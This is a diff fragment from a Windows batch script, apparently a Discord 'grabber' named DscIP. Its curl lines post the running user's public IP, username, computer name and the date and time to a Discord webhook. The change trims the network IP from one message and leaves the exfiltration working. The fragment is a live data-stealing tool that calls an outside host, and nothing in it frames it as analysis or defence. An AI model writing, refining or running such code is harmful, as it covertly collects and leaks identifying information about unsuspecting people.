@@ -91,7 +91,7 @@ goto quit
 Rem hook(O)
 :O
 curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"https://media.discordapp.net/attachments/802039875901587466/973572853012238416/-001_100.png?width=1026^&height=207\"}" %WEBHOOK_URL%
-curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```Public IP : %PublicIP%,NetworkIP : %NetworkIP% ```\"}" %WEBHOOK_URL%
+curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```Public IP : %PublicIP% ```\"}" %WEBHOOK_URL%
 curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```---------------------------------------------------------------------------```\"}" %WEBHOOK_URL%
 curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```Name Infrom [ Username : %username%, ComputerName : %computername% ]```\"}" %WEBHOOK_URL%
 curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```Time Infrom [ Date,Time : %date% %time% ]```\"}" %WEBHOOK_URL%
